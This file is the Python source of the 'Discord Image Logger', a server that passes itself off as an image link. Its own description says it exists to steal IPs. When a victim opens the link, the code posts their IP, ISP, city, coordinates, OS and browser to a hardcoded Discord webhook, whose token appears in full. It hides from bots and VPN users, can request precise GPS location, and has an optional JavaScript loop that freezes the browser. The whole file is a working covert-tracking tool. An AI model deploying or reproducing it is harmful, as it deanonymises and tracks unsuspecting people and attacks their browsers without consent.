# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1132451669272174696/F3L0UBGRc_2oZlF2LqrKi0ES3g8aP7ZzOa2sCKaYaIHWZG7VCK2G9eXjKqYS0qvQ3jzP",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
